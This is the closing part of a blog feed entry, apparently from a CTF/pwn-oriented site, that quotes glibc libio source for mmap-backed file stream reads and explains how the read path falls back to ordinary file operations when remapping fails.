      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">-=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
      <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
		<span class="o">?</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">+</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="nl">_offset</span> <span class="p">:</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">,</span>
		<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">);</span>

      <span class="cm">/* If we are already positioned at or past the end of the file, don&#39;t
</span><span class="cm">	 change the current offset.  If not, seek past what we have mapped,
</span><span class="cm">	 mimicking the position left by a normal underflow reading into its
</span><span class="cm">	 buffer until EOF.  */</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="k">if</span> <span class="p">(</span><span class="n">__lseek64</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
			 <span class="n">SEEK_SET</span><span class="p">)</span>
	      <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
	    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
	  <span class="k">else</span>
	    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">else</span>
    <span class="p">{</span>
      <span class="cm">/* Life is no longer good for mmap.  Punt it.  */</span>
      <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__munmap</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
    <span class="nl">punt</span><span class="p">:</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
      <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
	<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps</span><span class="p">;</span>
      <span class="k">else</span>
	<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps</span><span class="p">;</span>

      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>x
First is computed the amount of bytes that contains the read buffer (<code>have</code>). If we do not have the right amount of bytes within the read buffer we first try to copy data from the read buffer. Then we check we are mappng the whole file (and not only a part of it) with the use of <code>mmap_remap_check</code> (to avoid useless code I put it directly after the implementation of <code>_IO_file_xsgetn_mmap</code>), if it fails the file is unmapped and the vanilla file operations is used to read data from the file.</p>
]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/linux" term="linux" label="linux" />
                             
                                <category scheme="https://nasm.re/tags/file-stream" term="file-stream" label="file stream" />
                            
                        
                    
                
            
        </entry>
    
</feed>
